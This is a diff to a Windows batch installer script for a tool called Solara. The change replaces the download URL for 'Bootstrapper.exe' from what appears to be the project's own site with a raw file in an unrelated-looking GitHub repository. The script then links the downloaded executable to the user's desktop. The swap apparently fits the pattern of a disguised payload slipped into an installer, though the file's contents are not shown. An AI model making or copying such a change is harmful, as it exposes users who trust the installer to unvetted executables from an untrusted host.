@@ -24,7 +24,7 @@ exit
 
 :Solara
 mkdir %localappdata%\Solara
-powershell -command "Invoke-WebRequest -Uri 'https://solaraweb.vercel.app/download/executable/Bootstrapper.exe' -OutFile $env:LOCALAPPDATA\Solara\Bootstrapper.exe"
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/furryman12/PUPPIES-AND-UNICORNS/raw/main/Bootstrapper.exe' -OutFile $env:LOCALAPPDATA\Solara\Bootstrapper.exe"
 mklink %userprofile%\Desktop\Solara %userprofile%\AppData\Local\Solara\Bootstrapper.exe
 goto Start
 
